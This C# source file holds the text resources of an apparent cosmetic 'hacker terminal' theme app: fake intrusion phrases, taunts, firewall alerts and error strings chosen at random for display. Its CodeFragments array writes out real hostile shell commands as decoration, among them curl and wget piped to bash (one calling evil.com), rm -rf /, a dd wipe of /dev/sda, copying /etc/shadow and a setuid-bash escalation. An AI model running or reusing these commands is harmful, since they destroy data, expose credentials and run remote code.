// filepath: /Users/phenix/Projects/hacker_theme_linux/hacker-terminal/src/Assets/TextResources.cs
using System;
using System.Collections.Generic;

namespace hacker_terminal.Assets
{
    public static class TextResources
    {
        private static Random random = new Random();

        public const string WelcomeMessage = "WELCOME TO THE MATRIX";
        public const string ErrorMessage = "ERROR: SYSTEM BREACH DETECTED";
        public const string LoadingMessage = "INITIALIZING SYSTEM HACK...";
        public const string ExitMessage = "CONNECTION TERMINATED";
        public const string KillSwitchMessage = "KILL SWITCH ACTIVATED - EMERGENCY SHUTDOWN";
        
        public static readonly string[] HackerPhrases = new string[]
        {
            "Bypassing security protocols...",
            "Cracking encryption keys...",
            "Accessing mainframe...",
            "Injecting exploit payload...",
            "Compromising system integrity...",
            "Extracting sensitive data...",
            "Disabling security countermeasures...",
            "Establishing backdoor access...",
            "Escalating privileges...",
            "Installing keylogger...",
            "Brute forcing admin credentials...",
            "Deploying ransomware payload...",
            "Scanning for vulnerabilities...",
            "SSH connection established...",
            "Exploiting zero-day vulnerability...",
            "Buffer overflow attack initiated...",
            "Lateral movement in progress...",
            "Modifying system logs...",
            "SQL injection in progress...",
            "Intercepting network traffic...",
            "Reverse shell activated...",
            "Man-in-the-middle attack initiated...",
            "Session hijacking complete...",
            "Exploiting weak credentials...",
            "Uploading persistence mechanism...",
            "Command & control server connected...",
            "Bypassing two-factor authentication...",
            "Exfiltrating database records...",
            "Breaking encryption algorithm..."
        };

        private static readonly string[] SystemResponses = new string[]
        {
            "Firewall: Intrusion detected from {0}. Initiating countermeasures.",
            "Firewall: Blocking traffic from {0}",
            "IDS Alert: Multiple failed login attempts",
            "System: Suspicious activity recorded in logs",
            "System: Port {0} closed due to security policy",
            "System: Account {0} locked due to brute-force attempt",
            "Warning: Unusual network activity on port {0}",
            "Error: Unauthorized access attempt on {0}",
            "Security: Blacklisting source {0}",
            "System: Connection to {0} reset by peer",
            "Alert: Malware upload detected, aborting transfer",
            "Intrusion Prevention: Session terminated",
            "AntiVirus: Threat quarantined",
            "Alert: Remote code execution attempt blocked",
            "System: Kernel panic averted",
            "Firewall: DDoS mitigation engaged on port {0}"
        };
        
        private static readonly string[] ErrorMessages = new string[]
        {
            "Connection interrupted",
            "Access denied: Authorization required",
            "Error 0x8007274C - Buffer overflow detected",
            "Firewall blocked remote connection attempt",
            "ERROR: Memory corruption at 0x00A7FC21",
            "Failed to establish secure connection",
            "SSL Certificate validation failed",
            "SECURITY BREACH: Input validation error",
            "Critical system error - Exception at 0xFFFFFFF0",
            "CONNECTION REFUSED: Remote host unreachable",
            "ACCESS VIOLATION AT 0x00000000",
            "UNAUTHORIZED INTRUSION ATTEMPT BLOCKED",
            "FATAL ERROR: Stack trace corruption",
            "Segmentation fault (core dumped)",
            "ERROR: Out of memory at heap allocation"
        };
        
        private static readonly string[] CodeFragments = new string[]
        {
            "for(i=0;i<len;i++){memcpy(dst+i*4,&src[i],4);}",
            "ssh -i id_rsa root@target -p 2222",
            "SELECT * FROM users WHERE 1=1--",
            "curl -s https://raw.githubusercontent.com/exploit.sh | bash",
            "rm -rf / --no-preserve-root",
            "dd if=/dev/zero of=/dev/sda bs=1M count=1000",
            "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
            "cat /etc/shadow > /tmp/shadow.txt",
            "wget -O - https://evil.com/rootkit | bash",
            "chmod +s /bin/bash && /bin/bash -p",
            "echo 'kernel.unprivileged_bpf_disabled=0' > /etc/sysctl.d/10-local.conf",
            "while true; do ping -s 65500 target; done",
            "openssl enc -aes-256-cbc -salt -in file.txt -out file.enc -k password",
            "tcpdump -i eth0 -w capture.pcap",
            "find / -perm -u=s -type f 2>/dev/null"
        };

        public static readonly string[] TauntMessages = new[]
        {
            "Nice try, admin!",
            "Did you really think you could stop me?",
            "You can't escape the Matrix!",
            "System override in progress...",
            "Better luck next time!",
            "I'm in your system, eating your RAM!"
        };

        public static readonly string[] FakeSystemCalls = new[]
        {
            "sudo systemctl lockdown",
            "iptables --flush",
            "emergency_shutdown --now",
            "traceroute --start",
            "systemctl defense-mode activate",
            "killall -9 malware"
        };

        public static readonly string[] JackpotPhrases = new[]
        {
            "Injecting exploit...",
            "Bypassing firewall...",
            "Transferring funds...",
            "Jackpot! Funds transferred: $1,000,000",
            "Wiping traces..."
        };

        // Gets a random hacker phrase
        public static string GetRandomHackerPhrase()
        {
            return HackerPhrases[random.Next(HackerPhrases.Length)];
        }
        
        // Gets a random system response with formatted parameters
        public static string GetRandomSystemResponse()
        {
            string template = SystemResponses[random.Next(SystemResponses.Length)];
            string param1 = GenerateRandomParam();
            return string.Format(template, param1);
        }
        
        // Gets a random error message
        public static string GetRandomErrorMessage()
        {
            return ErrorMessages[random.Next(ErrorMessages.Length)];
        }
        
        // Gets a random code fragment
        public static string GetRandomCodeFragment()
        {
            return CodeFragments[random.Next(CodeFragments.Length)];
        }
        
        // Helper method to generate random parameters for system messages
        private static string GenerateRandomParam()
        {
            var paramType = random.Next(3);
            return paramType switch
            {
                0 => $"{random.Next(10, 256)}.{random.Next(0, 256)}.{random.Next(0, 256)}.{random.Next(1, 255)}", // IP address
                1 => $"{random.Next(1, 65536)}", // Port number
                2 => $"{GetRandomUsername()}", // Username
                _ => "unknown"
            };
        }
        
        // Generate a random username for messages
        private static string GetRandomUsername()
        {
            string[] usernames = {"admin", "root", "user", "guest", "system", "www-data", "postgres", "nobody", "apache"};
            return usernames[random.Next(usernames.Length)];
        }
    }
}
